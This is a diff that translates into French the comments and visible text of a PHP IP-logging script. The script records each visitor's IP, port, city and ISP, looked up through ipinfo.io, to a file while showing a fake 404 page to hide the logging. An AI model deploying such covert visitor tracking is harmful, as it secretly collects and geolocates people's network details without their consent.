@@ -71,12 +71,11 @@ function logData()
 	$date=date ("Y/m/d G:i:s"); 
 	$log=fopen("$ipLog", "a+"); 
 
-
-	// I use this site to get more infos about the IP addy such as city, ISP, location
+ // J'utilise ce site pour obtenir plus d'informations sur l'IP addy telles que la ville, le FAI, l'emplacement
 	$ip_details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
 
 
-// Write all data we got in 'information.txt'
+// Ecrit toutes les données que nous avons dans 'information.txt'
 	fwrite($log, "IP=" . $ip . PHP_EOL);
 	fwrite($log, "PORT=" . $rem_port . PHP_EOL);
 	fwrite($log, "CITY=" . $ip_details->city . PHP_EOL);
@@ -94,7 +93,7 @@ function logData()
 } 
 logData();
 ?>
-<!-- Diplaying a fake 404 page -->
+<!-- Affichage d'une fausse page 404 -->
   <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
 
@@ -145,8 +144,8 @@ logData();
     </style>
 </head>
 <body>
-    <h1>Page Not Found</h1>
-    <p>Sorry, but the page you were trying to view does not exist.</p>
+    <h1>Page non trouvée</h1>
+    <p>Désolé, mais la page que vous tentiez d'afficher n'existe pas.</p>
 </body>
 </html>
 </body>
